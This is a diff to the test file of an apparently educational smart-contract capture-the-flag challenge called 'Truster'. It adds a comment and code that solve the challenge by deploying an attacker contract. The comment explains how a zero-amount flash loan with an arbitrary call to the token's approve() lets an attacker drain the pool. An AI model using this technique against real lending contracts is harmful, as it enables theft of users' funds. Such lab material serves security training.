@@ -29,6 +29,16 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
+        /* The pool allows us to call any function: (bytes calldata data) from any contract: (address target) in its context
+         * We simply call the flashloan and ask for 0 tokens
+         * This way, the condition: (balanceAfter >= balanceBefore) will be true. 
+         * Meanwhile, we send the ERC20 token address as the targert and call its approve() function 
+         * to approve our address as the allowed spender and after returing from flashLoan() successfully, 
+         * we transfer all the pool's balance to ours. 
+         */
+	const AttackerFactory = await ethers.getContractFactory('TrusterAttacker', attacker);
+        this.attackerContract = await AttackerFactory.deploy(this.pool.address, this.token.address);
+        this.attackerContract.attack(attacker.address);
     });
 
     after(async function () {
